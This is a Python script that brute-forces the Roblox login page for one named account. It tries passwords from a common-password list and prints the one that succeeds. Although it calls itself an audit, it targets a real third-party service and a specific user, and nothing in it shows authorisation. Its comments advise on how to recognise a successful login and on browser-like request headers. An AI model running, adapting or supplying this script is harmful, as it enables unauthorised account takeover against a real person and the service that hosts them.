import requests
import time

# Configuration
TARGET_URL = "https://roblox.com/login"
USERNAME = "nono819819"
PASSWORD_FILE = "common-passwords.txt"
# A shorter delay is often used in local testing unless testing for bypass
DELAY = 0.5 

def perform_audit():
    # Use a Session object to handle cookies/CSRF automatically
    session = requests.Session()
    
    try:
        with open(PASSWORD_FILE, 'r') as f:
            for line in f:
                password = line.strip()
                
                # Use 'json=' if the API expects JSON, 'data=' for standard forms
                payload = {"username": USERNAME, "password": password}
                
                try:
                    # Some servers require specific Headers (like User-Agent) 
                    # to look like a real browser
                    headers = {'User-Agent': 'Security-Audit-Tool/1.0'}
                    response = session.post(TARGET_URL, json=payload, headers=headers, timeout=5)

                    # KEY STEP: You must know what a SUCCESS looks like.
                    # It might be a 302 redirect, or a specific string in the JSON.
                    if response.status_code == 200 and "welcome" in response.text.lower():
                        print(f"[!] SUCCESS: Password for {USERNAME} is: {password}")
                        return
                    
                    print(f"[-] Tried: {password} (Status: {response.status_code})")
                    
                except requests.exceptions.RequestException as e:
                    print(f"[!] Connection error: {e}")
                
                time.sleep(DELAY)
                
    except FileNotFoundError:
        print("[!] Password list not found.")

if __name__ == "__main__":
    perform_audit()